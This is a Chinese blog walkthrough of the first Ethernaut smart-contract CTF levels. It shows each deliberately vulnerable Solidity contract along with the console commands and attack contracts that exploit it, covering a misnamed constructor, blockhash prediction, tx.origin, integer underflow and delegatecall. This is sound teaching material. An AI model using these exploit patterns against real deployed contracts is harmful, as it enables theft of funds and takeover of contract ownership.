<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>【Ethernaut闯关录】上篇 - 黄阿信</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="【Ethernaut闯关录】上篇 - 黄阿信" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="https://yalexin.gitee.io/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-04T03:34:10.000Z" />
  
  <meta property="og:article:author" content="YaleXin" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
</head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/projects">Projects</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/网络攻防/">网络攻防</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>4,</span>
            <span>2023</span>
        </div>
        

        <h1 class="title">【Ethernaut闯关录】上篇</h1>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意中遇到一个网站<a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">【Ethernaut】</a>，类似于<code>ctf</code>平台一样，该网站有大概30个关卡，每个关卡都会考察一些智能合约的内容，正好把学来的知识实践一下，毕竟纸上得来终觉浅，绝知此事要躬行。</p>
<p>本篇是第一部分，主要涉及构造函数、<code>tx.origin</code>使用注意事项、整数溢出、<code>delegatecall</code>、<code>selfdestruct</code>等知识。</p>
<a id="more"></a>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>metamask：我使用的是chrome浏览器，安装这个插件比较容易，微软的edge也可以，而且后者下载插件比较简单</li>
<li>以太坊测试网：Goerli和Sepolia都可以，测试代币可分别在<a href="https://goerli-faucet.pk910.de/" target="_blank" rel="noopener">【1】</a>和<a href="https://sepolia-faucet.pk910.de/" target="_blank" rel="noopener">【2】</a>处获取，虽然得到的不多，但是足够完成所有关卡了。</li>
<li>remix：solidity编译器，有桌面版和网页在线版，我是用的是网页版，这是<a href="https://remix.ethereum.org" target="_blank" rel="noopener">【链接】</a>。桌面版无法连接metamask，有些关卡需要我们部署一些合约，对于remix网页版比较方便。</li>
</ul>
<p>好，以上条件都准备好以后，我们就可以开启我们的闯关之旅了！</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>这一关卡主要是熟悉本游戏的操作运用，不过说实话，本关卡我认为并不是最简单的，没有些脑洞，根本没法通关。</p>
<p>因此在控制台输入以下函数即可通关：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.info()</span><br><span class="line"><span class="keyword">await</span> contract.info1()</span><br><span class="line"><span class="keyword">await</span> contract.info2(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.infoNum()</span><br><span class="line"><span class="keyword">await</span> contract.info42()</span><br><span class="line"><span class="keyword">await</span> contract.theMethodName()</span><br><span class="line"><span class="keyword">await</span> contract.method7123949()</span><br><span class="line"><span class="keyword">await</span> contract.password()</span><br><span class="line"><span class="keyword">await</span> contract.authenticate(<span class="string">'ethernaut0'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">  &#x2F;&#x2F; 要求发送过来的小于 0.001</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#x2F;&#x2F; 如果发起方的贡献大于合约拥有者的贡献，则归属权转换</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 只有合约拥有者才能发起退款</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 注意这里是利用点</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong></p>
<ol>
<li>获得合约所有权</li>
<li>将合约所有者的余额清零</li>
</ol>
<p>要想改变合约的owner可以通过两种方法实现：</p>
<ol>
<li>不断调用contribute()函数</li>
<li>合约接收没有数据的纯ether(例如：转账函数))</li>
</ol>
<p>第一个不现实，我们使用第二个。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;) &#x2F;&#x2F;首先使贡献值大于0</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;) &#x2F;&#x2F;触发fallback函数</span><br><span class="line">contract.withdraw() &#x2F;&#x2F;将合约的balance清零</span><br></pre></td></tr></table></figure>

<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line">&#x2F;&#x2F; 调用方份额增加</span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向allocator转账数量为 allocations[allocator]</span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; 向发起方转账所有的（合约的）余额</span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>虽然代码中没有任何关于获取所有权的代码，但是仔细一看，发现构造函数写错了，因此所有人都可以调用<code>Fal1out()</code>函数来获得权限。</p>
<p>攻击步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.Fal1out(&#123;value: 1&#125;)</span><br></pre></td></tr></table></figure>

<p>然后submit</p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 要猜 side 的变量的值</span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>consecutiveWins</code>增加到10</p>
<p>题意是要我们“猜“上一个区块的哈希值转为<code>uint256</code>后，除以FACTOR后是不是1，要连续猜对10次，注意每次都要等新区快出现后才调用，否则会触发<code>lastHash == blockValue</code>。</p>
<p>看上去，很难猜得中，但是实际上区块的哈希我是<strong>可以获取到</strong>的！在控制台输入<code>help()</code>发现只有<code>getBlockNumber()</code>函数可以使用，无法使用<code>blockhash()</code>函数，看来不能仅使用控制台了。</p>
<p>实际上，我们可以使用一个辅助的合约，在合约中使用<code>blockhash</code>函数，部署和调用合约，我这里使用remix，然后将其连接到metamask中，连接过程可参考<a href="https://www.freesion.com/article/87861092736/#:~:text=%E4%BD%BF%E7%94%A8remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E5%8F%91%E5%B8%83%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%EF%BC%88%E4%BB%A3%E5%B8%81%EF%BC%89%E6%9C%80%E5%85%A8%E6%95%99%E7%A8%8B%201%20%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E8%AF%B7%E6%B3%A8%E6%84%8F%E5%A6%82%E6%9E%9C%E7%BC%96%E8%BE%91%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8EMetaMask%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8%20http,%E5%8D%8F%E8%AE%AE%E6%89%93%E5%BC%80%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%94%A8%20https%20%2C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%9C%89%E6%97%B6%E5%80%99%E4%BC%9A%E5%8F%91%E7%94%9F%E8%BF%99%E7%A7%8D%E4%BA%8B%E6%83%85%EF%BC%8C%E6%8D%A2%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E3%80%82%20https%E5%85%B6%E5%AE%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E5%8F%AA%E6%9C%89http%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%202%20%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%201.remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">【使用REMIX与METAMASK进行发布智能合约（代币）最全教程】</a></p>
<p>下面是攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlipAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    CoinFlip constant private target &#x3D; CoinFlip(0xbE079d11154090c4337c8958c33cD8D5Dc0409B1);</span><br><span class="line">    uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uint256 blockValue &#x3D; uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">        bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不断调用<code>attack()</code>函数，直至在控制台调用<code>await contract.consecutiveWins()</code>的返回值大于10，即可进行提交</p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>先看合约代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取合约的所有权。</p>
<p>代码很少啊，但是很清晰，里边使用了<code>tx.origin</code>，这个是返回最初发起交易的地址，比如说，A要发送一个交易给B，B将其转发到C，此时对于C来说，<code>tx.origin</code>就是<code>A</code>的地址。这么说有点不太正确，引用<a href="https://learnblockchain.cn/article/3568" target="_blank" rel="noopener">【登链社区】</a>的说法吧：</p>
<blockquote>
<p><strong>msg.sender:</strong> 指直接调用智能合约功能的帐户或智能合约的地址<br><strong>tx.origin:</strong> 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin</p>
</blockquote>
<p>那我们可以直接部署某个智能合约，在该合约中，调用<code>changeOwner</code>函数即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TelephoneAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; 该地址可以在控制台中输入 &#96;await contract&#96; 获取</span><br><span class="line">    Telephone constant private target &#x3D; Telephone(0xAcCE018DCB481A326A05E16f6F33f13C63FcC50A);</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在控制台输入<code>await contract.owner()</code>后，如果返回的是我们的用户地址，则说明我们已经成功拿下合约的所有权。</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：增加你手中的 token 数量</p>
<p>想要增加我们的代币量，一种方法是合约所有者调用<code>transfer</code>函数给我们发送代币，但是实际上我们无法冒充合约所有者，因此这种方法并不现实。</p>
<p>实际上本关卡考察的是溢出，<code>uint</code>是<code>uint256</code>的别名，该类型数据只能表示$[0,2^{256}-1]$，该类型的数据达到所能表示的最大值后，如果再加1，就会变成0.</p>
<p>我们再来看如何绕过<code>require(balances[msg.sender] - _value &gt;= 0)</code>。</p>
<p>实际上我们只要调用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.transfer(<span class="string">'0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae'</span>, <span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<p>即可，其中，<code>0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae</code>是一个和<code>player</code>不同的<strong>有效账户地址</strong>。</p>
<p>因为一开始我们的<code>player</code>的余额是20，其减去21，由于溢出，<code>balances[msg.sender] - _value</code>是一个256表示的最大值。</p>
<h2 id="Delatation"><a href="#Delatation" class="headerlink" title="Delatation"></a>Delatation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获取<code>Delegation</code>合约的所有权。</p>
<p>考察的是<code>delegatecall</code>用法，引用<a href="https://learnblockchain.cn/docs/solidity/introduction-to-smart-contracts.html?highlight=delegatecall" target="_blank" rel="noopener">【官方文档】</a>对其的介绍：</p>
<blockquote>
<p>有一种特殊类型的消息调用，被称为 <strong>委托调用(\</strong>delegatecall*<em>)*</em> 。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 <code>msg.sender</code> 和 <code>msg.value</code> 不变。 这意味着一个合约可以在运行时从另外一个地址动态加载代码。存储、当前地址和余额都指向发起调用的合约，只有代码是从被调用地址获取的。 这使得 Solidity 可以实现”库“能力：可复用的代码库可以放在一个合约的存储上，如用来实现复杂的数据结构的库。</p>
</blockquote>
<p>实际上：</p>
<ul>
<li><code>call</code>：<code>msg</code>变量会修改为<strong>调用者</strong>，执行环境为<strong>被调用者</strong>的运行环境</li>
<li><code>delegatecall</code>：<code>msg</code>变量<strong>不变</strong>，执行环境为<strong>调用者</strong>的运行环境</li>
<li><code>callcode</code>：<code>msg</code>变量会修改为调用者，执行环境为<strong>调用者</strong>的运行环境</li>
</ul>
